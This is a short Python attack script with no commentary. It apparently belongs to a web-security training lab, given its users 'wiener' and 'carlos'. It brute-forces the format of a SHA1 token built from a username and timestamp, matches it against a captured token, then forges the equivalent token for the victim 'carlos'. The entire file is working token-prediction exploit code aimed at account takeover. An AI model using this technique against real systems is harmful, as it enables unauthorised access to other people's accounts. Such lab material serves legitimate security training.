#!/usr/bin/env python3
import hashlib
from datetime import datetime

wiener_token = "5918b1c970efd19eba4ed48edfdd6d8cd921b4b9"
timestamp_str = "2025-10-01 00:49:58"

# Convert to datetime
dt = datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
unix_timestamp = int(dt.timestamp())

print(f"Target: {wiener_token}\n")

# Try different timestamp formats with milliseconds
for ms in range(1000):
    # Try various formats with milliseconds
    formats_to_test = [
        f"wiener{unix_timestamp}{ms:03d}",
        f"{unix_timestamp}{ms:03d}wiener",
        f"wiener{unix_timestamp}.{ms:03d}",
        f"{unix_timestamp}.{ms:03d}wiener",
    ]

    for fmt in formats_to_test:
        token = hashlib.sha1(fmt.encode()).hexdigest()
        if token == wiener_token:
            print(f"✓✓✓ MATCH FOUND! ✓✓✓")
            print(f"Format: {fmt}")
            print(f"Token: {token}")

            # Generate carlos's token
            carlos_fmt = fmt.replace("wiener", "carlos")
            carlos_token = hashlib.sha1(carlos_fmt.encode()).hexdigest()
            print(f"\nCarlos format: {carlos_fmt}")
            print(f"Carlos token: {carlos_token}")
            exit(0)

print("No match found in millisecond range. Token might use different format.")
